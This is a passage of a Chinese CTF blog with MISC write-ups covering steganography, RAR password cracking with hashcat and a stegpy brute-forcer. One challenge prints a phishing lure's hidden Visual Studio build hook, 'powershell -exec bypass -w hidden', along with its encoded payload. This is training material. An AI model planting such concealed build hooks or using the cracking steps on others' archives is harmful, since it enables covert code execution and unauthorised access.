ceboyrz</span><br></pre></td></tr></table></figure><p>怀疑栅栏</p><p><img lazyload src="/images/loading.svg" data-src="65Tv80.png" alt="65Tv80"></p><p>打开/xl</p><p><img lazyload src="/images/loading.svg" data-src="65TO5n.png" alt="65TO5n"></p><p>在shareStrings.xml里看到日记内容</p><p>重点在于：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;菜鸡的第十八天日记&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;前言：好像是这个女人，但是又好像不是这个女人诶，我好像找到她了！&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;rot13是个好东西不是吗？&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;flag在里面啦！！！大佬们再找找？？？&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;出题第十八天&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;高兴&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;我好像找到了这个女人了，终于问到师傅们菜鸡可以出什么题了，她跟我说她叫fufu，然后让我把flag藏到她身上，好像很有道理的样子诶，这就把flag交给她！&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br></pre></td></tr></table></figure><p>依次处理</p><p>上述文本rot13后：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">隐写.js can solve this problem</span><br></pre></td></tr></table></figure><p>在/media里得到几张图片</p><p><img lazyload src="/images/loading.svg" data-src="65TO5n.png" alt="65TO5n"></p><p>fufufufufufufufufuufufufufufufufufufufufufufufufufu.flag查看二进制后，更改后缀为.png</p><p>得到与image3.gif第一帧相同的图片，猜想盲水印。对比无果。</p><p>卡了很久。</p><p>尝试js隐写，查询【png隐写js】类似关键字无果。</p><p>突然想到，隐写=steganography，隐写.js=steganography.js</p><p>查询搜索引擎得</p><p><a class="link" href="http://www.peter-eigenschink.at/projects/steganographyjs/showcase/">http://www.peter-eigenschink.at/projects/steganographyjs/showcase/<i class="fas fa-external-link-alt"></i></a></p><p>秒出</p><p><img lazyload src="/images/loading.svg" data-src="65TjCq.png" alt="65TjCq"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nep &#123;D4La0_s0lve_th1s_probl3m_to_hit_c4ij1&#125;</span><br></pre></td></tr></table></figure><h3><span id="3">3</span></h3><h4><span id="make_hsy_great_again">make_hsy_great_again</span></h4><blockquote><p>Q师傅是韩商言的粉丝，前段日子他刚组装了台新电脑，并且要求我帮他装系统，我在他电脑里发现了这个。</p></blockquote><p>得到加密的make hsy great again_.rar</p><p>rar5用hashcat</p><p>第一步：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#rar2john hsy.rar</span><br><span class="line">&gt;hsy.rar:$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2</span><br></pre></td></tr></table></figure><p>第二步：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat --force -m 13000 -a 3 &#39;$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2&#39; ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure><p>开始爆破</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2:520233</span><br><span class="line">                                                 </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Type........: RAR5</span><br><span class="line">Hash.Target......: $rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98...8772c2</span><br><span class="line">Time.Started.....: Thu Mar 25 14:36:44 2021 (14 mins, 55 secs)</span><br><span class="line">Time.Estimated...: Thu Mar 25 14:51:39 2021 (0 secs)</span><br><span class="line">Guess.Mask.......: ?d?d?d?d?d?d [6]</span><br><span class="line">Guess.Queue......: 1&#x2F;1 (100.00%)</span><br><span class="line">Speed.#1.........:      262 H&#x2F;s (6.99ms) @ Accel:512 Loops:128 Thr:1 Vec:8</span><br><span class="line">Recovered........: 1&#x2F;1 (100.00%) Digests, 1&#x2F;1 (100.00%) Salts</span><br><span class="line">Progress.........: 233984&#x2F;1000000 (23.40%)</span><br><span class="line">Rejected.........: 0&#x2F;233984 (0.00%)</span><br><span class="line">Restore.Point....: 23040&#x2F;100000 (23.04%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:6-7 Iteration:32768-32799</span><br><span class="line">Candidates.#1....: 525587 -&gt; 516587</span><br></pre></td></tr></table></figure><p>密码【520233】，得到【hhhhhhsy.png】</p><p>通过010editor看到格式</p><p><img lazyload src="/images/loading.svg" data-src="hsy.jpg" alt="hsy"></p><p>结合png格式，编写倒置函数：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Untitled1&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">   <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> g:</span><br><span class="line"></span><br><span class="line">        g.write(f.read()[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>得到另一张图片【flag.png】，表面看跟已知图片一样，丢进Beyond Compare 4</p><p>对比两张图片，得到</p><p><img lazyload src="/images/loading.svg" data-src="hsy2.jpg" alt="hsy2"></p><p>根据提示【flag{too_young_too_simple hint Crypto}】</p><p>找到hint Crypto脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">72</span>):</span><br><span class="line">    a = im.getpixel((<span class="number">2069</span>,j))[<span class="number">3</span>]</span><br><span class="line">    flag += <span class="built_in">str</span>(a)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nep&#123;Qfrost_l0v3_hsy_v3r7_m0ch&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;1&quot;&gt;1&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span id=&quot;涅普冬令营misc签到&quot;&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;sharun：这题有很多解啊&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本次涅普MISC的感受是，考点不难</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>VNCTF2021</title>
    <link href="http://mklkx.github.io/2021/03/24/VNCTF2021/"/>
    <id>http://mklkx.github.io/2021/03/24/VNCTF2021/</id>
    <published>2021-03-24T07:32:05.000Z</published>
    <updated>2021-05-04T11:39:39.242Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="1">1</span></h3><h4><span id="vnctf-2021冰冰好像藏着秘密">[VNCTF 2021]冰冰好像藏着秘密</span></h4><blockquote><p>发现冰冰藏着的flag，flag格式为VNCTF{*}</p></blockquote><p>得到FFT.rar</p><p>但是直接打开会提示</p><p><img lazyload src="/images/loading.svg" data-src="FFT.jpg" alt="FFT"></p><p><img lazyload src="/images/loading.svg" data-src="FFT2.jpg" alt="FFT2"></p><p>这个存在一个考察的点：rar伪加密</p><p>但是在实战中笔者发现两个绕过的方法</p><p>1)用kali打开</p><p>2)如上图图二所示，在winrar报错的情况下，直接拖出FFT.png，也能达到解压的效果</p><p>而按出题人本身的意思，是在使用010打开的情况下：</p><p>把下图的84改成80</p><p><img lazyload src="/images/loading.svg" data-src="FFT3.jpg" alt="FFT3"></p><p>第二步：</p><p>1)隐形水印工具也能得到水印：</p><p><img lazyload src="/images/loading.svg" data-src="FFT6.jpg" alt="FFT6"></p><p>放大可以看到flag</p><p>2)通过搜索得知文件名FFT为：</p><p><img lazyload src="/images/loading.svg" data-src="FFT4.jpg" alt="FFT4"></p><p>下面是大佬脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">img = cv.imread(<span class="string">&#x27;FFT.png&#x27;</span>, <span class="number">0</span>) <span class="comment">#直接读为灰度图像</span></span><br><span class="line">f = np.fft.fft2(img)            <span class="comment">#做频率变换</span></span><br><span class="line">fshift = np.fft.fftshift(f)     <span class="comment">#转移像素做幅度谱</span></span><br><span class="line">s1 = np.log(np.<span class="built_in">abs</span>(fshift))<span class="comment">#取绝对值：将复数变化成实数取对数的目的为了将数据变化到0-255</span></span><br><span class="line">plt.subplot(<span class="number">121</span>)</span><br><span class="line">plt.imshow(img, <span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;original&#x27;</span>)</span><br><span class="line">plt.subplot(<span class="number">122</span>)</span><br><span class="line">plt.imshow(s1,<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="FFT5.jpg" alt="FFT5"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VNCTF&#123;Ff5_1S_bEauTiful&#125;</span><br></pre></td></tr></table></figure><h3><span id="2">2</span></h3><h4><span id="vnctf-2021happynewyear">[VNCTF 2021]HAPPYNEWYEAR</span></h4><blockquote><p>祝大家牛年快乐！牛转钱坤！(flag为VNCTF{}）Hint1:<a class="link" href="https://www.dcode.fr/tools-list#symbols">https://www.dcode.fr/tools-list#symbols<i class="fas fa-external-link-alt"></i></a>Hint2:stegpy，但是不是那么白给的stegpy</p></blockquote><p>得到加密压缩包和password.png</p><p>可以看出png里藏着古典密码，结合hint1，找到相应的加密方法：</p><p>Chinese Code&amp;Sheikah Language</p><p><img lazyload src="/images/loading.svg" data-src="HAPPY1.jpg" alt="HAPPY1"></p><p><img lazyload src="/images/loading.svg" data-src="HAPPY2.jpg" alt="HAPPY2"></p><p>组合得到压缩包密码：</p><p><img lazyload src="/images/loading.svg" data-src="Inkedpassword_LI.jpg" alt="Inkedpassword_LI"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f87840bdddcc01e4</span><br></pre></td></tr></table></figure><p>打开压缩包，得到happynewyear.png</p><p>接下来就是stegpy的内容</p><p>stegpy工具的安装：</p><p><a class="link" href="https://blog.csdn.net/weixin_45728976/article/details/109018040">https://blog.csdn.net/weixin_45728976/article/details/109018040<i class="fas fa-external-link-alt"></i></a></p><p>附上改动后的出题人脚本，实现爆破</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import os</span><br><span class="line">from subprocess import Popen,PIPE</span><br><span class="line">import sys</span><br><span class="line">def checkwebp(pic):</span><br><span class="line">    print(&quot;IF you don&#39;t need a password for the pic please input 1&quot;) # 无密钥</span><br><span class="line">    print(&quot;IF you know the password of the pic please input 2&quot;) # 有密钥且已知</span><br><span class="line">    print(&quot;IF not input 3 I will use the password.txt&quot;) # 有密钥但未知</span><br><span class="line">    choice &#x3D; input()</span><br><span class="line">    if choice &#x3D;&#x3D; &#39;1&#39;:</span><br><span class="line">        os.system(&quot;stegpy &#123;&#125;&quot;.format(pic))</span><br><span class="line">    elif choice &#x3D;&#x3D; &#39;2&#39;:</span><br><span class="line">        print(&quot;INPUT THE password:&quot;)</span><br><span class="line">        password &#x3D; input()</span><br><span class="line">        cmd &#x3D; [&quot;stegpy&quot;, &quot;-p&quot;,pic]</span><br><span class="line">        subp &#x3D; Popen([sys.executable, &#39;-c&#39;, &#39;import pty, sys; pty.spawn(sys.argv[1:])&#39;, *cmd],stdin&#x3D;PIPE,stdout&#x3D;PIPE,stderr&#x3D;PIPE)</span><br><span class="line">        print(subp.stdout.read(len(&quot;Enter password (will not be echoed):&quot;)))</span><br><span class="line">        subp.stdin.write(bytes((password+&#39;\n&#39;).encode(&#39;utf-8&#39;)))</span><br><span class="line">        subp.stdin.flush()</span><br><span class="line">        print(subp.stdout.readlines())</span><br><span class="line">        # print(subp.stdout.readlines()[1])</span><br><span class="line">        print(&#39;\n&#39;)</span><br><span class="line">    elif choice &#x3D;&#x3D; &#39;3&#39;:</span><br><span class="line">        file &#x3D; open(&#39;password.txt&#39;, &#39;r&#39;)</span><br><span class="line">        line &#x3D; file.readline()</span><br><span class="line">        while line:</span><br><span class="line">            print(line)</span><br><span class="line">            cmd &#x3D; [&quot;stegpy&quot;, &quot;-p&quot;, pic]</span><br><span class="line">            subp &#x3D; Popen([sys.executable, &#39;-c&#39;, &#39;import pty, sys; pty.spawn(sys.argv[1:])&#39;, *cmd], stdin&#x3D;PIPE, stdout&#x3D;PIPE,stderr&#x3D;PIPE)</span><br><span class="line">            print(subp.stdout.read(len(&quot;Enter password (will not be echoed):&quot;)))</span><br><span class="line">            subp.stdin.write(bytes((line + &#39;\n&#39;).encode(&#39;utf-8&#39;)))</span><br><span class="line">            subp.stdin.flush()</span><br><span class="line">            print(&#39;result:&#39;)</span><br><span class="line">            print(subp.stdout.readlines()[1])</span><br><span class="line">            # print(subp.stdout.readlines()[1])</span><br><span class="line">            print(&#39;\n&#39;)</span><br><span class="line">            line &#x3D; file.readline()</span><br><span class="line">    else :</span><br><span class="line">        print(&#39;Input Wrong!&#39;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    checkwebp(&#39;happynewyear.png&#39;)</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="HAPPY4.jpg" alt="HAPPY4"></p><p>得到flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VNCTF&#123;HappyNewY3a5&#125;</span><br></pre></td></tr></table></figure><h3><span id="3">3</span></h3><h4><span id="vnctf-2021interesting_fishing">[VNCTF 2021]interesting_fishing</span></h4><blockquote><p>crazyman_army是某安全公司的研究人员</p><p>这天他的其邮箱里发现了一封奇怪的邮件</p><p>你能帮助他找到其隐藏的信息吗</p><p>附件是第一部分的flag</p><p>图片是第二部分的flag</p><p>最后flag为 第一部分+第二部分(vnctf{*})</p></blockquote><p>注释.txt:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crazyman_army是某安全公司的研究人员</span><br><span class="line">这天他的其邮箱里发现了一封奇怪的邮件 </span><br><span class="line">你能帮助他找到其隐藏的信息吗</span><br><span class="line"></span><br><span class="line">注意:</span><br><span class="line">附件是第一部分的flag</span><br><span class="line">图片是第二部分的flag</span><br><span class="line">最后flag为 第一部分+第二部分</span><br><span class="line"></span><br><span class="line">hint:powershell解码后的字符可能存在不可读的情况 那并不是解码错误</span><br></pre></td></tr></table></figure><p>研究项目的讨论.bin</p><p><img lazyload src="/images/loading.svg" data-src="interesting1.jpg" alt="interesting1"></p><p>更改后缀为.eml，能看到是一封邮件。</p><p>用<a class="link" href="https://www.foxmail.com/">foxmail<i class="fas fa-external-link-alt"></i></a>打开</p><p>就可以把图片和附件另存为到本机了。</p><p>先处理附件：</p><p>发现giveyourflag.sln，用vs打开</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    std::cout &lt;&lt; &quot;Hi boy\n&quot;;</span><br><span class="line">    std::cout &lt;&lt; &quot;This is your flag:flag&#123;Th1s_iS_f@kE_fL4G&#125;\n&quot;;</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Visual Studio2017&gt;生成&gt;生成giveyourflag</p><p>若出现【无法找到v142的生成工具(平台工具集=“v142”)。】，Visual Studio2017&gt;项目&gt;giveyourflag属性&gt;配置属性&gt;常规&gt;平台工具集&gt;【v142(未安装)】更改为【Visual Studio 2017 (v141)】</p><p>重新生成后的得到报错【命令&quot;powershell -exec bypass -w hi&quot;dd&quot;en -f x64\Debug\Browse.VC.db】</p><p>缺少上述文件，但在压缩包里找不到。</p><p>可能是文件隐藏。</p><p>系统搜索【文件资源管理器选项】&gt;查看&gt;取消勾选”隐藏受保护的操作系统文件(推荐)“</p><p>看到该文件。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$encodestring &#x3D; &quot;XAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQANwA4AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAMQA4AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAAzAD8AXAB1AC0ANgA1ADQAOAAxAD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAOAAyAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAwAD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgAzAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA5AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQANQA2AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA3AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANQA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgAxAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgA5AD8AXAB1AC0ANgA1ADQANQA3AD8AXAB1AC0ANgA1ADQANQAwAD8AXAB1AC0ANgA1ADQANgAzAD8AXAB1AC0ANgA1ADQANgA4AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQANwA5AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgAyAD8A&quot;</span><br><span class="line">$bytes  &#x3D; [System.Convert]::FromBase64String($string);</span><br><span class="line">$decoded &#x3D; [System.Text.Encoding]::UTF8.GetString($bytes); </span><br><span class="line">echo $decoded</span><br></pre></td></tr></table></figure><p>根据代码，cyberchef经过from base64操作后得到</p><p>RTF格式下的unicode编码</p><p>附上官方脚本：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s&#x3D;r&quot;\u-65432?\u-65420?\u-65420?\u-65424?\u-65421?\u-65478?\u-65489?\u-65489?\u-65418?\u-65426?\u-65437?\u-65420?\u-65434?\u-65491?\u-65486?\u-65487?\u-65485?\u-65491?\u-65487?\u-65486?\u-65483?\u-65481?\u-65488?\u-65482?\u-65487?\u-65487?\u-65486?\u-65485?\u-65490?\u-65437?\u-65425?\u-65421?\u-65490?\u-65439?\u-65424?\u-65491?\u-65426?\u-65439?\u-65426?\u-65430?\u-65431?\u-65426?\u-65433?\u-65490?\u-65427?\u-65415?\u-65423?\u-65437?\u-65428?\u-65425?\u-65419?\u-65436?\u-65490?\u-65437?\u-65425?\u-65427?\u-65489?\u-65456?\u-65415?\u-65425?\u-65426?\u-65433?\u-65415?\u-65439?\u-65426?\u-65433?\u-65499?\u-65486?\u-65488?\u-65421?\u-65420?\u-65425?\u-65422?\u-65435?\u-65421?\u-65499?\u-65486?\u-65488?\u-65428?\u-65425?\u-65417?\u-65499?\u-65486?\u-65488?\u-65425?\u-65426?\u-65499?\u-65486?\u-65488?\u-65434?\u-65425?\u-65422?\u-65435?\u-65431?\u-65433?\u-65426?\u-65499?\u-65486?\u-65488?\u-65433?\u-65425?\u-65425?\u-65436?\u-65421?\u-65499?\u-65486?\u-65488?\u-65439?\u-65427?\u-65431?\u-65436?\u-65499?\u-65486?\u-65488?\u-65458?\u-65425?\u-65422?\u-65420?\u-65432?\u-65499?\u-65486?\u-65488?\u-65461?\u-65425?\u-65422?\u-65435?\u-65439?\u-65426?\u-65499?\u-65486?\u-65488?\u-65469?\u-65457?\u-65450?\u-65463?\u-65468?\u-65491?\u-65487?\u-65479?\u-65499?\u-65486?\u-65488?\u-65424?\u-65439?\u-65422?\u-65439?\u-65426?\u-65425?\u-65431?\u-65439?\u-65490?\u-65422?\u-65439?\u-65422?&quot;</span><br><span class="line">l&#x3D;list(s[3:-1].split(r&quot;?\u-&quot;))</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in l:</span><br><span class="line">    flag+&#x3D;chr(65536-int(i))</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行后得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vnctf-213-1257061123.cos.ap-nanjing.myqcloud.com&#x2F;Pyongyang%20stores%20low%20on%20foreign%20goods%20amid%20North%20Korean%20COVID-19%20paranoia.rar</span><br></pre></td></tr></table></figure><p>一个加密的压缩包，提示密码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">maskcode</span><br><span class="line">The password is: four digits</span><br></pre></td></tr></table></figure><p>ARCHPR爆破无果。</p><p>得到一个工具Accent RAR Password Recovery，发现【编码与密码】的压缩包里有，只不过存在版本问题，附上下载链接：<a class="link" href="https://gd.jisuxz.com/down_new/accent_rar_password_recovery.rar">https://gd.jisuxz.com/down_new/accent_rar_password_recovery.rar<i class="fas fa-external-link-alt"></i></a></p><p>但因为是英文版，就添加了【编码与密码】里的chinese.lng，再运行.reg文件</p><p>同时根据https://www.muruoxi.com/pc/2253.html修复报错</p><p><img lazyload src="/images/loading.svg" data-src="interesting2.jpg" alt="interesting2"></p><p>利用密码【9705】打开压缩包，得到Pyongyang stores low on foreign goods amid North Korean COVID-19 paranoia.docx</p><p>更改后缀名.zip</p><p>解压后打开word&gt;hideinfo.xml</p><p><img lazyload src="/images/loading.svg" data-src="interesting3.jpg" alt="interesting3"></p><p>宽字符隐写得</p><figure class="highlight plain"><table><tr><td class="code"><pre><span 